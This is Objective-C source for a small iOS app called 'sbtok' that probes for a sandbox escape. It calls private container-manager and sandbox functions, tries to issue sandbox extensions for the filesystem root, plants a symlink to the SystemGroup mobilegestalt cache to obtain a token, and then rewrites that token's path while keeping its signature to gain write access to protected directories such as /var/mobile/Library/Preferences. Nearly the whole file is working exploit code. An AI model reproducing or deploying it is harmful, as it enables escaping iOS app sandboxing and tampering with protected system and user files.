// sbtok — probe direct sandbox extension issuance and token tampering around
// the MCM class-7 part token.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <fcntl.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);
typedef char *(*fn_issue)(const char *, const char *, uint32_t);

static fn_create q_create;
static fn_set_u64 q_class, q_part, q_flags;
static fn_set_obj q_group;
static fn_get_one q_get;
static fn_copy_token q_token;
static fn_free q_free;
static fn_consume s_consume;
static fn_release s_release;
static fn_xpc_string xpc_string;
static fn_xpc_release xpc_release_fn;
static fn_issue s_issue;
static NSString *gGroup;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbtok] %@", s);
}

static BOOL load(void) {
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!h) { L(@"MCM dlopen failed %s", dlerror()); return NO; }
    q_create = (fn_create)dlsym(h, "container_query_create");
    q_class = (fn_set_u64)dlsym(h, "container_query_set_class");
    q_group = (fn_set_obj)dlsym(h, "container_query_set_group_identifiers");
    q_part = (fn_set_u64)dlsym(h, "container_query_operation_set_part");
    q_flags = (fn_set_u64)dlsym(h, "container_query_operation_set_flags");
    q_get = (fn_get_one)dlsym(h, "container_query_get_single_result");
    q_token = (fn_copy_token)dlsym(h, "container_copy_sandbox_token");
    q_free = (fn_free)dlsym(h, "container_query_free");
    s_consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    s_release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    xpc_string = (fn_xpc_string)dlsym(RTLD_DEFAULT, "xpc_string_create");
    xpc_release_fn = (fn_xpc_release)dlsym(RTLD_DEFAULT, "xpc_release");
    void *sh = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW | RTLD_LOCAL);
    s_issue = (fn_issue)dlsym(sh ? sh : RTLD_DEFAULT, "sandbox_extension_issue_file");
    L(@"load q=%p get=%p tok=%p consume=%p issue=%p", q_create, q_get, q_token, s_consume, s_issue);
    return q_create && q_get && q_token && s_consume;
}

static NSString *findGroup(void) {
    NSArray *ids = @[@"group.8e0bc870a21520b9.1", @"group.8e0bc870a21520b9.2",
                     @"group.8e0bc870a21520b9.3", @"group.8e0bc870a21520b9.4",
                     @"group.8e0bc870a21520b9.5"];
    for (NSString *gid in ids) {
        NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gid];
        if (u.path.length) return gid;
    }
    return nil;
}

static void checkAccess(NSString *tag) {
    NSString *prefs = @"/var/mobile/Library/Preferences";
    errno = 0;
    DIR *d = opendir(prefs.fileSystemRepresentation);
    L(@"[%@] opendir prefs=%p errno=%d", tag, d, errno);
    if (d) closedir(d);
    errno = 0;
    NSString *m = [prefs stringByAppendingPathComponent:[NSString stringWithFormat:@"sbtok_%@", tag]];
    int fd = open(m.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    L(@"[%@] write prefs fd=%d errno=%d", tag, fd, errno);
    if (fd >= 0) { write(fd, "x", 1); close(fd); unlink(m.fileSystemRepresentation); }
}

static void tryIssue(const char *cls, const char *path) {
    errno = 0;
    char *t = s_issue ? s_issue(cls, path, 0) : NULL;
    L(@"issue cls=%s path=%s -> %s errno=%d", cls, path, t ? "YES" : "NO", errno);
    if (!t) return;
    NSString *ts = [NSString stringWithUTF8String:t];
    L(@"issue tokenstr=%@", ts);
    int64_t h = s_consume(t);
    L(@"issue consume=%lld", (long long)h);
    if (h >= 0) {
        checkAccess(@"direct");
        s_release(h);
    }
    free(t);
}

static char *queryToken(void) {
    void *q = q_create();
    q_class(q, 7);
    void *x = xpc_string ? xpc_string(gGroup.UTF8String) : NULL;
    q_group(q, x);
    q_part(q, 3);
    q_flags(q, 0x8000000000ULL);
    void *res = q_get(q);
    char *tok = (res && q_token) ? q_token(res) : NULL;
    L(@"query res=%p token=%s", res, tok ? "YES" : "NO");
    if (q_free) q_free(q);
    if (x && xpc_release_fn) xpc_release_fn(x);
    return tok;
}

static void testTamper(NSString *base, NSString *newPath, NSString *tag) {
    NSRange r = [base rangeOfString:@";" options:NSBackwardsSearch];
    if (r.location == NSNotFound) { L(@"tamper %@: no sep", tag); return; }
    NSString *t = [[base substringToIndex:r.location + 1] stringByAppendingString:newPath];
    L(@"tamper %@ token=%@", tag, t);
    errno = 0;
    int64_t h = s_consume(t.UTF8String);
    L(@"tamper %@ consume=%lld errno=%d", tag, (long long)h, errno);
    if (h >= 0) { checkAccess(tag); s_release(h); }
}

static void runProbe(void) {
    @autoreleasepool {
        L(@"=== sbtok start uid=%d pid=%d", getuid(), getpid());
        if (!load()) return;
        checkAccess(@"before");

        // 1. Direct issuance from this sandboxed process.
        tryIssue("com.apple.app-sandbox.read-write", "/");
        tryIssue("com.apple.app-sandbox.read", "/");
        tryIssue("com.apple.app-sandbox.read-write", "/var/mobile/Library/Preferences");
        tryIssue("com.apple.sandbox.container", "/");

        // 2. Valid MCM token for the SystemGroup cache path.
        gGroup = findGroup();
        if (!gGroup) return;
        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *root = [fm containerURLForSecurityApplicationGroupIdentifier:gGroup].path;
        NSString *lib = [root stringByAppendingPathComponent:@"Library"];
        NSString *part = [lib stringByAppendingPathComponent:@"Caches"];
        NSString *valid = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
        [fm removeItemAtPath:part error:nil];
        symlink(valid.fileSystemRepresentation, part.fileSystemRepresentation);

        char *tok = queryToken();
        if (!tok) { L(@"no mcm token"); return; }
        NSString *ts = [NSString stringWithUTF8String:tok];
        L(@"mcm tokenstr=%@", ts);
        int64_t h = s_consume(tok);
        L(@"mcm consume=%lld", (long long)h);

        // 3. Tamper with the path while keeping the signature.
        testTamper(ts, @"/", @"root");
        testTamper(ts, @"/private/var", @"privatevar");
        testTamper(ts, @"/var/mobile/Library/Preferences", @"prefs");
        testTamper(ts, @"/private/var/containers/Shared/SystemGroup", @"systemgroup");

        if (h >= 0) s_release(h);
        free(tok);
        unlink(part.fileSystemRepresentation);
        symlink(valid.fileSystemRepresentation, part.fileSystemRepresentation);
        L(@"=== sbtok done ===");
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor systemBackgroundColor];
    UILabel *l = [[UILabel alloc] initWithFrame:vc.view.bounds];
    l.text = @"sbtok"; l.textAlignment = NSTextAlignmentCenter;
    [vc.view addSubview:l];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runProbe(); });
    return YES;
}
@end
int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
